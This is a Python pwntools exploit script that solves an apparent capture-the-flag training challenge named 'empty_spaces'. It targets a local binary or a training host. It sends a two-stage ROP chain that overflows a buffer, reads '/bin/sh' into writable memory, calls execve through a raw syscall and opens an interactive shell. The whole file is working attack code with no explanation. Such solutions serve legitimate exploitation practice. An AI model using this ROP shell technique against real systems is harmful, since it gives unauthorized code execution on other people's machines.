from pwn import *
import time

CHALL_PATH = "./empty_spaces"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
b *0x4019A3
c
"""

context.arch = "amd64"

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
elif args.REM:
    c = remote("empty-spaces.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)

syscall = 0x40ba76
pop_rsi = 0x477d3d
pop_rdi = 0x4787b3
pop_rax = 0x42146b
bin = 0x4ac000

pop_rdx = 0x4447d5
mov_edx_val = 0x4390b5


# Prepare to read in buffer but with bigger size
rop_chain = b"\x00" * 72
rop_chain += p64(pop_rdi)
rop_chain += p64(0)
rop_chain += p64(mov_edx_val) # Big value in edx
rop_chain += p64(syscall)

# Insert new rop_chain overwriting the previous one. Open read for /bin/sh
rop_chain_2 = b"\x00" * 104 # overwrite with zeros + bytes previously inserted
rop_chain_2 += p64(pop_rdi)
rop_chain_2 += p64(0)
rop_chain_2 += p64(pop_rax) 
rop_chain_2 += p64(0)
rop_chain_2 += p64(pop_rsi)
rop_chain_2 += p64(bin) # write /bin/sh in a writable part of code
rop_chain_2 += p64(mov_edx_val) 
rop_chain_2 += p64(syscall) #read /bin/sh

# Prepare for execve
rop_chain_2 += p64(pop_rdx)
rop_chain_2 += p64(0)
rop_chain_2 += p64(pop_rax)
rop_chain_2 += p64(0x3b)
rop_chain_2 += p64(pop_rdi)
rop_chain_2 += p64(bin)
rop_chain_2 += p64(pop_rsi)
rop_chain_2 += p64(0)
rop_chain_2 += p64(syscall)



c.recvuntil(b"pwn?")
c.send(rop_chain)
time.sleep(0.1)
c.send(rop_chain_2)
time.sleep(1)

c.send(b"/bin/sh\x00")

c.interactive()